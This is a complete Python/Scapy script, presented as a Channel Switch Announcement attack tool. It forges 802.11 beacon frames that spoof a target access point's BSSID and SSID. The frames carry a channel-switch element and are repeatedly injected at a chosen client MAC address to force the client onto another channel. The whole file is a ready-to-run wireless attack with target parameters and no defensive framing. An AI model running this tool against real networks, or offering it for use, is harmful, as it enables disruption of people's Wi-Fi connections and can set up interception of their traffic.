#!/usr/bin/env python3
import argparse
import os
import time
from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp

def set_channel(iface, channel):
    os.system(f"iw dev {iface} set channel {channel}")

def channel_switch_attack(args):
    set_channel(args.iface, args.current_channel)
    end_time = time.time() + args.time
    print(f"[*] Injecting on channel {args.current_channel}")
    print(f"[*] Forcing the target to switch to channel {args.new_channel}")

    dot11 = Dot11(type=0, subtype=8, addr1=args.mac, addr2=args.bssid, addr3=args.bssid)
    beacon = Dot11Beacon(cap='ESS+privacy')
    essid = Dot11Elt(ID='SSID', info=args.ssid, len=len(args.ssid))
    csa_info = b"\x00" + bytes([args.new_channel]) + b"\x00"
    csa = Dot11Elt(ID=37, info=csa_info)
    frame = RadioTap()/dot11/beacon/essid/csa

    print(f"[*] Sending CSA frames for {args.time} seconds...")
    while time.time() < end_time:
        sendp(frame, iface=args.iface, verbose=0)
        time.sleep(args.interval)

    print("[*] CSA attack finished.")

def parse_args():
    parser = argparse.ArgumentParser(
        description='Channel Switch Announcement (CSA) attack tool.'
    )
    parser.add_argument('-i', '--iface', required=True, type=str,
                        help='Monitor-mode interface (e.g., wlan0)')
    parser.add_argument('-b', '--bssid', required=True, type=str,
                        help='BSSID of the target AP')
    parser.add_argument('-m', '--mac', required=True, type=str,
                        help='MAC address of the target client')
    parser.add_argument('-s', '--ssid', required=True, type=str,
                        help='SSID of the target network')
    parser.add_argument('-c', '--current-channel', type=int, default=11,
                        help='Actual AP channel (default: 11)')
    parser.add_argument('-n', '--new-channel', type=int, default=1,
                        help='Channel to force the client onto (default: 1)')
    parser.add_argument('-t', '--time', required=True, type=int,
                        help='Duration of the attack (in seconds)')
    parser.add_argument('-r', '--interval', type=float, default=0.1,
                        help='Interval between frame transmissions (seconds)')
    return parser.parse_args()


def main():
    args = parse_args()
    try:
        channel_switch_attack(args)
    except KeyboardInterrupt:
        print("[*] Attack interrupted by the user.")

if __name__ == '__main__':
    main()
